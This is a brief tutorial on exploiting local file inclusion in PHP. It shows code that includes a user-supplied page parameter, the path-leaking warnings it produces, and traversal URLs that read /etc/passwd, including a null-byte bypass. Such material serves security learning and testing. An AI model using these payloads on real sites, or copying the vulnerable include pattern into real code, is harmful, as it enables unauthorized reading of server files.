# LFI | How to exploit

## Application Example:

```php
<?php
    include("db.php");
    include($_GET["page"]);
?>
```

If you try to put  `hack.php'` on the URL parameter:\
**ex**: `https://example.com/example/page.php?page=hack.php'`

### It's common to see this message on the application:

**Warning:** include(/var/www/html/example/hack.php'): failed to open stream: No such file or directory in **/var/www/html/example/page.php** on line **28**

**Warning:** Include(): Failed opening '/var/www/html/example/hack.php" for inclusion (include\_path='.:/usr/share/php') in **/var/www/html/example/page.php** on line **28**

## Exploit:

```
https://example.com/example/page.php?page=/../../../../etc/passwd
```

#### If the application tries to put the ".php" extension on the URL final

The warning error show for you if you try to put etc/passwd: \
**Warning:** include(/../../etc/passwd.php) ....\
\
For **bypass**, It's simple, try to use **NullByte** (**%00**) to kill the rest of the line:

```
https://example.com/example/page.php?page=/../../../../etc/passwd%00
```
